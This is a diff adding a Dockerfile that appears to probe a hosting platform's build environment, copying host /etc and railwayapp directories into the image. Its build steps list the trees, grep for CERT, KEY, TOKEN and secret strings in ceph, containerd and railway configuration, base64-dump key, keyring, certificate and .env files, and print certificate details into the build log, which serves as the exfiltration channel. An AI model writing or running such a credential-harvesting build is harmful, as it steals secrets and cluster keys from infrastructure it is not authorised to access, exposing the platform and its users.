@@ -1,0 +1,15 @@
+# I67886-A-1f9e
+FROM alpine:3.20
+RUN echo "MARKER_I67886A_1f9e"
+COPY etc /h/etc
+COPY var/lib/railwayapp /h/railwayapp
+RUN apk add --no-cache openssl >/dev/null 2>&1; echo APKDONE
+RUN echo "===A_TREE_RAILWAYAPP"; find /h/railwayapp -printf '%y %s %p -> %l\n' 2>/dev/null | head -600
+RUN echo "===A_TREE_ETC"; find /h/etc -maxdepth 2 -printf '%y %s %p -> %l\n' 2>/dev/null | head -700
+RUN echo "===A_CAND_FILES"; find /h/etc /h/railwayapp -type f \( -iname '*.pem' -o -iname '*.crt' -o -iname '*.key' -o -iname '*.p12' -o -iname '*.pfx' -o -iname '*.der' -o -iname '*.keyring' -o -iname '*.conf' -o -iname '*.yaml' -o -iname '*.yml' -o -iname '*.json' -o -iname '*.toml' -o -iname '*.env' \) -size -300k 2>/dev/null | head -400
+RUN echo "===A_GREP"; grep -rIaisE 'rrp://|storage-agent|depot|cluster|node/|CERT|KEY|TOKEN|secret' /h/etc/ceph /h/etc/railway* /h/etc/containerd /h/railwayapp 2>/dev/null | cut -c1-300 | head -300; echo GREP_END
+RUN echo "===A_ETC_RAIL"; ls -lad /h/etc/railway* /h/etc/ceph* /h/etc/containerd* 2>/dev/null; echo LS_END
+RUN echo "===A_DUMP"; for f in $(find /h/etc/ceph /h/etc/railway* /h/etc/containerd /h/railwayapp -type f -size -120k 2>/dev/null); do case "$f" in *.pem|*.crt|*.key|*.keyring|*.conf|*.yaml|*.yml|*.json|*.toml|*.env) echo "@@@FILE $f"; base64 -w0 "$f" 2>/dev/null | cut -c1-8000; echo;; esac; done; echo DUMP_END
+RUN echo "===A_CERTINFO"; for f in $(find /h/etc/ceph /h/etc/railway* /h/etc/containerd /h/railwayapp -type f \( -iname '*.pem' -o -iname '*.crt' -o -iname '*.key' -o -iname '*.p12' -o -iname '*.pfx' \) -size -200k 2>/dev/null); do echo "@@CERT $f"; openssl x509 -in "$f" -noout -subject -issuer 2>/dev/null; echo "@@SPKI $(openssl x509 -in "$f" -noout -pubkey 2>/dev/null | openssl pkey -pubin -outform DER 2>/dev/null | sha256sum | cut -d' ' -f1)"; echo "@@EKU $(openssl x509 -in "$f" -noout -ext extendedKeyUsage 2>/dev/null | tail -1)"; done; echo CERTINFO_END
+RUN echo "MARKER_I67886A_DONE"
+CMD ["sh","-c","sleep 3600"]
